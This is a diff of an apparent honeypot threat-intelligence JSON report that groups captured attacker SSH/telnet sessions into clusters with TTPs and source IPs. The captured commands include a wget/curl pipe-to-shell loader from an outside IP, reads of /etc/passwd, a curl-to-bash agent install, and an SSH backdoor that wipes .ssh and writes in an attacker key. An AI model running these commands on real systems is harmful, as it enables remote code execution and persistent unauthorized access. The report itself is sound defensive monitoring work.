@@ -1,16 +1,16 @@
 {
-  "generated_at": "2026-08-10T02:03:53.278574+00:00",
-  "total_sessions_with_commands": 14,
-  "total_clusters": 1,
-  "campaign_clusters": 1,
-  "singleton_clusters": 0,
-  "highest_severity": "MEDIUM",
+  "generated_at": "2026-08-10T05:36:47.494895+00:00",
+  "total_sessions_with_commands": 32,
+  "total_clusters": 8,
+  "campaign_clusters": 2,
+  "singleton_clusters": 3,
+  "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-001",
+      "cluster_id": "CLU-003",
       "name": "Recon Loader Script",
       "severity": "MEDIUM",
-      "session_count": 14,
+      "session_count": 19,
       "unique_ip_count": 1,
       "ttps": [
         "T1082",
@@ -18,11 +18,124 @@
         "T1078",
         "T1083"
       ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "name": "mdrfckr SSH Key Injection",
+      "severity": "HIGH",
+      "session_count": 2,
+      "unique_ip_count": 2,
+      "ttps": [
+        "T1021.004",
+        "T1078",
+        "T1070",
+        "T1140",
+        "T1105"
+      ]
     }
   ],
   "clusters": [
     {
       "cluster_id": "CLU-001",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "121.40.20.65"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c5066f4a71b0151c",
+      "ttps": [
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        },
+        {
+          "id": "T1003",
+          "name": "Credential Dumping"
+        }
+      ],
+      "representative_commands": [
+        "id",
+        "cat /etc/passwd",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "bash",
+        "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
+        "wget --no-check-certificate -qO- https://217.60.195.113/sh"
+      ],
+      "members": [
+        {
+          "session_id": "IR-ad7b0b6f2f00",
+          "src_ip": "121.40.20.65",
+          "country": "CN",
+          "isp": "Aliyun Computing Co., LTD",
+          "command_count": 11,
+          "timestamp": "2026-08-10T04:15:28.054376Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-002",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "220.90.220.204"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c74cbeb6eac6dc54",
+      "ttps": [
+        {
+          "id": "T1083",
+          "name": "File & Directory Discovery"
+        },
+        {
+          "id": "T1082",
+          "name": "System Information Discovery"
+        },
+        {
+          "id": "T1592",
+          "name": "Gather Victim Host Info"
+        }
+      ],
+      "representative_commands": [
+        "/ip cloud print",
+        "ifconfig",
+        "uname -a",
+        "cat /proc/cpuinfo",
+        "ps | grep '[Mm]iner'",
+        "ps -ef | grep '[Mm]iner'",
+        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+        "locate D877F783D5D3EF8Cs",
+        "echo Hi | cat -n"
+      ],
+      "members": [
+        {
+          "session_id": "IR-8e8d9a70588c",
+          "src_ip": "220.90.220.204",
+          "country": "KR",
+          "isp": "Korea Telecom",
+          "command_count": 9,
+          "timestamp": "2026-08-10T01:25:55.187888Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-003",
       "is_campaign": true,
       "campaign_name": "Recon Loader Script",
       "campaign_severity": "MEDIUM",
@@ -53,9 +166,9 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 14,
+      "session_count": 19,
       "unique_ips": [
-        "193.32.162.27"
+        "92.118.39.14"
       ],
       "unique_ip_count": 1,
       "sequence_hash": "d2ac04915390abe8",
@@ -90,116 +203,401 @@
       ],
       "members": [
         {
-          "session_id": "IR-2d0e18c51621",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-0e74d4233255",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:00:54.012480Z"
+          "timestamp": "2026-08-10T04:09:35.030794Z"
         },
         {
-          "session_id": "IR-1e63e14d1711",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-e2b7faf6a43e",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:02:03.884147Z"
+          "timestamp": "2026-08-10T04:12:04.440810Z"
         },
         {
-          "session_id": "IR-6ef2a2b5355e",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-01dfe974d3c8",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:03:11.590753Z"
+          "timestamp": "2026-08-10T04:14:32.715554Z"
         },
         {
-          "session_id": "IR-7ba917793ec2",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-2decef47887e",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:04:15.827414Z"
+          "timestamp": "2026-08-10T04:19:25.937546Z"
         },
         {
-          "session_id": "IR-cb527ab7e188",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-e15597b5b48d",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:05:18.075913Z"
+          "timestamp": "2026-08-10T04:21:46.930321Z"
         },
         {
-          "session_id": "IR-2f2fe35f5d8c",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-9c7ffb5c97d2",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:06:19.461587Z"
+          "timestamp": "2026-08-10T04:24:07.082040Z"
         },
         {
-          "session_id": "IR-13f76dc2cb96",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-4c487dd80575",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:07:14.635668Z"
+          "timestamp": "2026-08-10T04:26:27.928064Z"
         },
         {
-          "session_id": "IR-127b4bb164c9",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-56219686a2c2",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:08:10.796418Z"
+          "timestamp": "2026-08-10T04:28:44.223428Z"
         },
         {
-          "session_id": "IR-ae8f12492e0b",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-f7428ca3d482",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:09:07.448545Z"
+          "timestamp": "2026-08-10T04:31:08.343146Z"
         },
         {
-          "session_id": "IR-442dfa97124c",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-1a32bf4a9f56",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:10:05.990803Z"
+          "timestamp": "2026-08-10T04:33:30.849416Z"
         },
         {
-          "session_id": "IR-6d9071aeed0b",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-90f3f5f0b3ee",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:11:02.929813Z"
+          "timestamp": "2026-08-10T04:35:52.245574Z"
         },
         {
-          "session_id": "IR-158ee93f61ca",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-c134cfad2c5b",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:11:59.894801Z"
+          "timestamp": "2026-08-10T04:38:11.968397Z"
         },
         {
-          "session_id": "IR-7d45bd637d95",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-90cda6f2956e",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:12:56.927800Z"
+          "timestamp": "2026-08-10T04:40:36.092190Z"
         },
         {
-          "session_id": "IR-a6895755c66b",
-          "src_ip": "193.32.162.27",
+          "session_id": "IR-d7fce2e8a978",
+          "src_ip": "92.118.39.14",
           "country": "RO",
-          "isp": "UNMANAGED LTD",
+          "isp": "DMZHOST",
           "command_count": 9,
-          "timestamp": "2026-08-10T00:13:52.852860Z"
+          "timestamp": "2026-08-10T04:42:58.004909Z"
+        },
+        {
+          "session_id": "IR-328e619c24e9",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:45:15.037585Z"
+        },
+        {
+          "session_id": "IR-55fa3ec8efc0",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:47:34.593816Z"
+        },
+        {
+          "session_id": "IR-0ddbd8417a08",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:49:51.753093Z"
+        },
+        {
+          "session_id": "IR-f30b303cce4a",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:52:12.386189Z"
+        },
+        {
+          "session_id": "IR-0991db8bd947",
+          "src_ip": "92.118.39.14",
+          "country": "RO",
+          "isp": "DMZHOST",
+          "command_count": 9,
+          "timestamp": "2026-08-10T04:54:29.024472Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-004",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 2,
+      "unique_ips": [
+        "158.178.141.210"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "d2af147dd3fa2817",
+      "ttps": [
+        {
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
+        }
+      ],
+      "representative_commands": [
+        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
+        "apt-get update -y",
+        "apt-get install -y python3",
+        "python3 /tmp/bendi.py",
+        "rm /tmp/bendi.py",
+        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
+        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
+      ],
+      "members": [
+        {
+          "session_id": "IR-9cd76e06385f",
+          "src_ip": "158.178.141.210",
+          "country": "AU",
+          "isp": "Oracle Svenska AB",
+          "command_count": 7,
+          "timestamp": "2026-08-10T03:13:23.104118Z"
+        },
+        {
+          "session_id": "IR-2cbfa3e14cbb",
+          "src_ip": "158.178.141.210",
+          "country": "AU",
+          "isp": "Oracle Svenska AB",
+          "command_count": 7,
+          "timestamp": "2026-08-10T03:15:48.800124Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-005",
+      "is_campaign": true,
+      "campaign_name": "mdrfckr SSH Key Injection",
+      "campaign_severity": "HIGH",
+      "campaign_description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+      "matched_campaigns": [
+        {
+          "name": "mdrfckr SSH Key Injection",
+          "ttps": [
+            "T1021.004",
+            "T1078",
+            "T1105"
+          ],
+          "severity": "HIGH",
+          "description": "Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.",
+          "pattern_hits": 3,
+          "pattern_total": 3
+        }
+      ],
+      "session_count": 2,
+      "unique_ips": [
+        "69.6.234.27",
+        "92.62.233.214"
+      ],
+      "unique_ip_count": 2,
+      "sequence_hash": "98af0db988d5971c",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        },
+        {
+          "id": "T1078",
+          "name": "Valid Accounts"
+        },
+        {
+          "id": "T1070",
+          "name": "Indicator Removal"
+        },
+        {
+          "id": "T1140",
+          "name": "Deobfuscate/Decode Files"
+        },
+        {
+          "id": "T1105",
+          "name": "T1105"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
+      ],
+      "members": [
+        {
+          "session_id": "IR-2bf0f4670500",
+          "src_ip": "92.62.233.214",
+          "country": "CZ",
+          "isp": "Starnet s.r.o.",
+          "command_count": 2,
+          "timestamp": "2026-08-10T01:56:27.358119Z"
+        },
+        {
+          "session_id": "IR-1949fb6a39c8",
+          "src_ip": "69.6.234.27",
+          "country": "CO",
+          "isp": "Newfold Digital, Inc.",
+          "command_count": 2,
+          "timestamp": "2026-08-10T04:14:00.088467Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-006",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3,
+      "unique_ips": [
+        "207.175.155.36",
+        "207.175.148.67",
+        "207.175.35.41"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "6c2b02475f4c7e7e",
+      "ttps": [],
+      "representative_commands": [
+        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
+        "Accept-Encoding: gzip"
+      ],
+      "members": [
+        {
+          "session_id": "IR-280febe0f7a8",
+          "src_ip": "207.175.155.36",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-08-10T03:11:23.041919Z"
+        },
+        {
+          "session_id": "IR-5d0a17ac0eec",
+          "src_ip": "207.175.148.67",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-08-10T03:40:03.126787Z"
+        },
+        {
+          "session_id": "IR-0fbefe2ca4bb",
+          "src_ip": "207.175.35.41",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 2,
+          "timestamp": "2026-08-10T04:16:35.909143Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-007",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 1,
+      "unique_ips": [
+        "42.240.164.208"
+      ],
+      "unique_ip_count": 1,
+      "sequence_hash": "c32b4937ce8564ea",
+      "ttps": [
+        {
+          "id": "T1021.004",
+          "name": "Remote Services: SSH"
+        }
+      ],
+      "representative_commands": [
+        "cd ~; chattr -ia .ssh; lockr -ia .ssh"
+      ],
+      "members": [
+        {
+          "session_id": "IR-6134834c3ec9",
+          "src_ip": "42.240.164.208",
+          "country": "CN",
+          "isp": "Shanghai UCloud Information Technology Company Limited",
+          "command_count": 1,
+          "timestamp": "2026-08-10T02:50:06.126886Z"
+        }
+      ]
+    },
+    {
+      "cluster_id": "CLU-008",
+      "is_campaign": false,
+      "campaign_name": null,
+      "campaign_severity": null,
+      "campaign_description": null,
+      "matched_campaigns": [],
+      "session_count": 3,
+      "unique_ips": [
+        "207.175.155.36",
+        "207.175.148.67",
+        "207.175.35.41"
+      ],
+      "unique_ip_count": 3,
+      "sequence_hash": "758d61f26a444483",
+      "ttps": [],
+      "representative_commands": [
+        "PING"
+      ],
+      "members": [
+        {
+          "session_id": "IR-0727252a1963",
+          "src_ip": "207.175.155.36",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-10T03:11:31.635632Z"
+        },
+        {
+          "session_id": "IR-d117f0b77fa0",
+          "src_ip": "207.175.148.67",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-10T03:40:16.736772Z"
+        },
+        {
+          "session_id": "IR-ffa4827c7605",
+          "src_ip": "207.175.35.41",
+          "country": "BE",
+          "isp": "Google LLC",
+          "command_count": 1,
+          "timestamp": "2026-08-10T04:16:49.299871Z"
         }
       ]
     }
